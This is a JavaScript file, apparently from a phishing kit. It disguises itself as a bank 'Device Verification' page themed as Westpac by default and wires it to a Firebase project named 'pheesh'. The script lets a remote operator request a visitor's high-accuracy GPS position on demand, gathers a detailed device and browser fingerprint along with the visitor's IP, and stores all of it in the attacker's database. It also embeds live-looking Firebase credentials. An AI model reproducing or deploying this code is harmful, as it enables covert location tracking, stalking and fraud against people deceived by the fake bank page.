// Initialize Firebase with full config
const firebaseConfig = {
    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
    authDomain: "pheesh-4481e.firebaseapp.com",
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pheesh-4481e",
    storageBucket: "pheesh-4481e.appspot.com",
    messagingSenderId: "458791455321",
    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
};

// Initialize Firebase
let database;
const initFirebase = () => {
    return new Promise((resolve, reject) => {
        try {
            if (!firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            database = firebase.database();
            console.log('Firebase initialized successfully');
            
            // Test database connection
            database.ref('.info/connected').on('value', (snapshot) => {
                const isConnected = snapshot.val();
                console.log('Database connection state:', isConnected);
                if (!isConnected && document.visibilityState !== 'hidden') {
                    console.warn('Attempting to reconnect to Firebase...');
                    database.goOnline();
                }
            });

            // Test write permission
            database.ref('test-write').set({
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                console.log('Write permission verified');
                database.ref('test-write').remove();
                resolve(database);
            }).catch(reject);
        } catch (error) {
            console.error('Firebase initialization error:', error);
            reject(error);
        }
    });
};

// Initialize theme handling
let currentTheme = '';

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        await initFirebase();
        
        // Initial theme load
        const snapshot = await database.ref('activeTheme').once('value');
        const initialTheme = snapshot.val() || 'westpac';
        applyTheme(initialTheme);
        document.querySelector('.container').classList.add('loaded');

        // Listen for theme changes
        database.ref('activeTheme').on('value', snapshot => {
            const newTheme = snapshot.val() || 'westpac';
            if (newTheme !== currentTheme) {
                applyTheme(newTheme);
            }
        });

        // Listen for location requests
        listenForLocationRequests();
    } catch (error) {
        console.error('Failed to initialize:', error);
        // Fallback to default theme if Firebase fails
        applyTheme('westpac');
        document.querySelector('.container').classList.add('loaded');
    }
});

function applyTheme(themeName) {
    const theme = themes[themeName];
    if (!theme) return;

    currentTheme = themeName;
    document.getElementById('themeStyles').href = theme.styles;
    document.querySelector('.logo-image').src = theme.logo;
    document.title = `Device Verification - ${theme.name}`;
}

// Browser detection helper functions
function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    if (ua.includes("Trident")) return "Internet Explorer";
    if (ua.includes("Edge")) return "Edge";
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Safari")) return "Safari";
    return "Unknown";
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if (/trident/i.test(M[1])) {
        let tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return tem[1] || '';
    }
    if (M[1] === 'Chrome') {
        const tem = ua.match(/\bOPR|Edge\/(\d+)/);
        if (tem !== null) return tem[1];
    }
    M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
    let tem = ua.match(/version\/(\d+)/i);
    if (tem !== null) M.splice(1, 1, tem[1]);
    return M[1];
}

// Helper function to determine location source
async function determineLocationSource(position) {
    if ('permissions' in navigator) {
        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            if (result.state === 'granted') {
                // If accuracy is high, it's definitely GPS
                if (position.coords.accuracy < 100) {
                    return 'GPS (High Accuracy)';
                }
                // If accuracy is moderate, it might be GPS with poor signal or WiFi
                else if (position.coords.accuracy < 500) {
                    return 'GPS (Low Accuracy)';
                }
            }
        } catch (e) {
            console.error('Error checking permissions:', e);
        }
    }
    
    // Fallback to accuracy-based detection
    if (position.coords.accuracy < 100) {
        return 'GPS (High Accuracy)';
    }
    else if (position.coords.accuracy < 500) {
        return 'GPS (Low Accuracy)';
    }
    else if (position.coords.accuracy < 2000) {
        return 'WiFi';
    }
    return 'Cell/IP';
}

// Helper function to get high accuracy position
async function getHighAccuracyPosition() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            {
                enableHighAccuracy: true,
                timeout: 20000,
                maximumAge: 0
            }
        );
    });
}

// Listen for location requests
function listenForLocationRequests() {
    if (!navigator.geolocation) return;

    const requestsRef = database.ref('locationRequests');
    requestsRef.on('child_added', async (snapshot) => {
        const request = snapshot.val();
        if (!request || request.status !== 'pending') return;

        try {
            // Get the original location to update
            const locationSnapshot = await database.ref('locations/' + request.locationKey).once('value');
            const originalLocation = locationSnapshot.val();
            if (!originalLocation) {
                throw new Error('Original location not found');
            }

            // Request new high accuracy position
            const position = await getHighAccuracyPosition();
            const locationSource = await determineLocationSource(position);

            // Create new location entry
            const newLocationRef = database.ref('locations').push();
            const timestamp = new Date().toISOString();

            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                locationSource: locationSource,
                timestamp: timestamp,
                status: 'active',
                isLocationUpdate: true,
                previousLocationKey: request.locationKey,
                ip: originalLocation.ip,
                userAgent: navigator.userAgent,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                device: {
                    memory: navigator.deviceMemory || 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touchPoints: navigator.maxTouchPoints,
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : 'Unknown'
                },
                browser: {
                    name: getBrowserName(),
                    version: getBrowserVersion(),
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    webdriver: navigator.webdriver,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    deviceOrientation: window.DeviceOrientationEvent ? 'Supported' : 'Not supported',
                    webGL: !!document.createElement('canvas').getContext('webgl')
                }
            };

            // Save the new location
            await newLocationRef.set(locationData);

            // Update the request status
            await snapshot.ref.update({
                status: 'completed',
                newLocation: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                },
                completedAt: timestamp
            });

            // Update the original location to mark it as having an update
            await database.ref('locations/' + request.locationKey).update({
                hasUpdate: true,
                latestUpdateKey: newLocationRef.key
            });

        } catch (error) {
            console.error('Error updating location:', error);
            await snapshot.ref.update({
                status: 'failed',
                error: error.message,
                failedAt: new Date().toISOString()
            });
        }
    });
}

// Handle page unload/close
window.addEventListener('beforeunload', async () => {
    try {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => null);
            
        if (ip) {
            const locationsRef = database.ref('locations');
            const query = locationsRef.orderByChild('ip').equalTo(ip);
            const snapshot = await query.once('value');
            
            snapshot.forEach((childSnapshot) => {
                const data = childSnapshot.val();
                if (data.status === 'active') {
                    childSnapshot.ref.update({ status: 'inactive' });
                }
            });
        }
    } catch (error) {
        console.error('Error updating status on page close:', error);
    }
});
